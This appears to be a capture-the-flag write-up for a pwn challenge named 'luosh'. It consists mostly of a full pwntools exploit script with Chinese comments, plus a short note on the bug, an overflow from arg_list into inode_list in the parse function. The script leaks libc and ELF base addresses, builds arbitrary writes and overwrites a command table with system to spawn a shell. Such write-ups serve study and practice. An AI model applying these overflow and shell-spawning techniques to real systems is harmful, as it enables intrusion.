# luosh
```py
from pwn import *
context.arch="amd64"
p=process("./pwn1")
libc=ELF("./libc.so.6")
def touch(name):
    p.sendlineafter("> ",f"touch {name}")
def echo(content='',name='',payload=b'',raw=False):
    if not raw:
        p.sendlineafter("> ",f"echo {content} > {name}")
    else:
        p.sendlineafter("> ",payload)
def rm(name):
    p.sendlineafter("> ",f"rm {name}")
def cat(name):
    p.sendlineafter("> ",f"cat {name}")
def write(addr,value):
    echo("","",b"echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > aaaaaaaa"+p64(addr)[:-2],True)
    if isinstance(value,int):
        if b'\x00' in p64(value):
            echo("","",b"echo "+p64(value).replace(b'\x00',b'')+b" > 0",True)
        else:
            echo("","",b"echo "+p64(value)+b" > 0",True)
    elif isinstance(value,bytes):
        echo("","",b"echo "+value+b" > 0",True)
def luofuck():
    p.sendlineafter("> ","luofuck")
#在获知第一个地址前，无法利用inode_list进行任意地址读/写
#unsorted bin里的第一个chunk包含libc地址
#这里让即将被放入unsorted bin的chunk的地址为xx00，inode_list的第一个inode的内容chunk为xx4f（其他的也行，重要的是这个chunk的地址除了最后一个字节，其他字节都和装有libc地址的chunk一样）
#这样无需提前知道任何地址，只需覆盖一个null byte，就能稳定拿到libc地址
touch("0")
echo("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa","0")
touch("1")
echo("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","1")
echo("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","0")
for i in range(2,10):
    touch(f"{i}")
    echo("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",f"{i}")
for i in range(2,9):
    rm(f"{i}")
rm("1")
echo("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","aaaaaaaa")
cat("0")
libc.address=u64(p.recv(6).ljust(8,b'\x00'))-0x21ace0
#目前还不知道为什么，但是第一个inode结构的size会被清空。为了之后的任意地址写，需要恢复这个size
#这里多分配几个chunk，尝试拿回unsorted bin里的chunk
for i in range(2,11):
    touch(f"{i}")
    echo("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",f"{i}")
#这样rm('0')时free不会报错
rm('0')
#重新touch再往里面echo东西就恢复size了。后面不touch新的文件就没事
touch("0")
echo("wow it works can you believe it?","0")
#泄漏elf base。装输入命令的那个buf末尾正好和一个elf地址连着。写满0x200个字符就能顺带着把地址打印出来
payload='a'*0x200
p.sendafter("> ",payload)
p.recvuntil(payload)
elf_base=u64(p.recv(6).ljust(8,b'\x00'))-0x1cc2
#这个位置正好是command_list+ord('h')*0x18+0x8
bss=elf_base+0x4688
#最后一步，利用command_list+idx*0x18+0x8 getshell
#我们最多只能在末尾写一个null byte（字符串末尾自带的）。可是目标地址不完全是null，写个system地址后高位还有东西
#于是我们先利用字符串末尾的null byte把高位覆盖
write(bss+1,libc.sym['system'])
#然后写system地址
write(bss,libc.sym['system'])
#command_list结构里在这个位置记录某个命令需要多少参数，如果不覆盖的话会显示参数过少
#为什么写三遍和上面同理
write(bss+8+2,b'\x01')
write(bss+8+1,b'\x01')
write(bss+8,b'\x01')
#luofuck命令的作用是不重置idx，带着arg_list call个东西。我们需要arg_list里带有system的参数sh，同时又要写idx
#idx位于elf_base+0x4060。这里的技巧是利用错位，让elf_base+0x4060仅包含一个h，因为直接往idx写sh太大了
write(elf_base+0x4060-1,b"sh")
luofuck()
p.interactive()
```
漏洞出现在parse函数。虽然在nargs大于10时不会执行命令，但仍然会使用strcpy将参数拷贝进arg_list。在参数过多的情况下，会溢出到下面的inode_list

谢谢比赛中给我提示的chick佬（佬你是叫这个名字吧，锤子聊天记录解完题就没了……）。我自己没找到luofuck命令和idx的关系，走了很多关于getshell的弯路。我还在想该怎么绕过echo里的限制，连fsop都考虑过了，就是没看到这个最简单的可能性

另外这题的IO量是有限制的，能发送和接收的字符量有上限。如果超过这个上限直接EOFError。我最初泄漏elf base的思路不是这个，而是利用inode_list的任意地址读读`__environ`。而且我恢复inode_list的方法更简单粗暴，直接拿一堆a覆盖到size字段，然后利用末尾的null byte一点一点把其他东西恢复。虽然可以在本地成功，但放到远程就IO量超标了，遂换了种更聪明的方式。被这玩意卡了两天，在疯的边缘游走（

各位明年见了ʕ •ᴥ•ʔ